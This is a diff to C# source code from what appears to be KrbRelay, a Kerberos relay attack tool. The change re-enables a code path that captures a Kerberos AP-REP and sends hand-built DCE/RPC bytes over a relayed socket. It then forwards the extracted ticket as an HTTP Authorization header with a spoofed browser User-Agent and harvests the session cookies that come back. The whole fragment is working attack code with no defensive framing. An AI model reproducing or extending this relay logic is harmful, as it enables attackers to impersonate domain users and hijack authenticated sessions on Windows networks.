@@ -114,13 +114,10 @@ namespace KrbRelay.Clients
 
                         else
                         {
-                            /*
-                            // MORE PROCESSING REQUIRED
-                            //DCOM
-                            
+
+
                             apRep1 = Convert.FromBase64String(headerValue);
-                            Console.WriteLine("[*] Header: {0} ", header.Value);
-                            
+//                            /Console.WriteLine("[**] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
 
                             byte[] moreArray = new byte[] { 0x05, 0x00, 0x0C, 0x07, 0x10, 0x00, 0x00, 0x00, 0xEE, 0x00, 0xAA, 0x00, 0x03, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xF6, 0x15, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };
                             byte[] buffer = new byte[4096];
@@ -144,14 +141,21 @@ namespace KrbRelay.Clients
                             outbuffer[12] = Program.CallID[0];
 
                             Array.Copy(Program.AssocGroup, 0, outbuffer, 20, 4);
-                            //Program.stream.Write(outbuffer, 0,outlen);
-                            Program.currSourceSocket.Send(outbuffer, 0);
+                            Program.currSourceSocket.Send(outbuffer);
+                            //Console.WriteLine(Program.HexDump(outbuffer));
+                            //Console.WriteLine(Program.HexDump(Program.AssocGroup, 16, 4));
+                            //Console.WriteLine(Program.HexDump(outbuffer,16,24));
+                            //Program.stream.Write(outbuffer, 0, outlen);
+                            
 
-                            //Program.tcpFwd.state.DestinationSocket.Send(outbuffer, outlen, SocketFlags.None);
 
+                            //int l = Program.stream.Read(buffer, 0, buffer.Length);
+                            int l = Program.currSourceSocket.Receive(buffer);
+                           // Program.forwdardmode = true;
+                            //currSocketServer.state.isRelayed = false;
 
-                            int l = Program.currDestSocket.Receive(buffer);
-                            //int l =Program.tcpFwd.state.SourceSocket.Receive(buffer);
+                            //currSocketServer.CloseConnection(currSocketServer.state);
+                            
 
                             int pattern = KrbRelay.Helpers.PatternAt(buffer, new byte[] { 0xa1, 0x81 });
                             int l3 = l - pattern;
@@ -165,9 +169,14 @@ namespace KrbRelay.Clients
                                 message.Headers.Add("Authorization", cookie);
                                 message.Headers.Add("Connection", "keep-alive");
                                 message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
-                                Console.WriteLine("sending");
+                                //Console.WriteLine("sending");
                                 result = httpClient.SendAsync(message).Result;
                             }
+                            Program.forwdardmode = true;
+                            currSocketServer.state.isRelayed = false;
+
+                            currSocketServer.CloseConnection(currSocketServer.state);
+
                             IEnumerable<string> cookies = null;
                             foreach (var h in result.Headers)
                             {
@@ -206,10 +215,17 @@ namespace KrbRelay.Clients
                                 Console.WriteLine("[-] {0}", e);
                             }
 
-
+                           //Program.forwdardmode = true;
+                           //currSocketServer.state.isRelayed = false;
+                           //currSocketServer.CloseConnection(currSocketServer.state);
+                            
+                            
                             return;
-                        */
                         }
+
+
+
+                    
                         return;
                     }
                 }
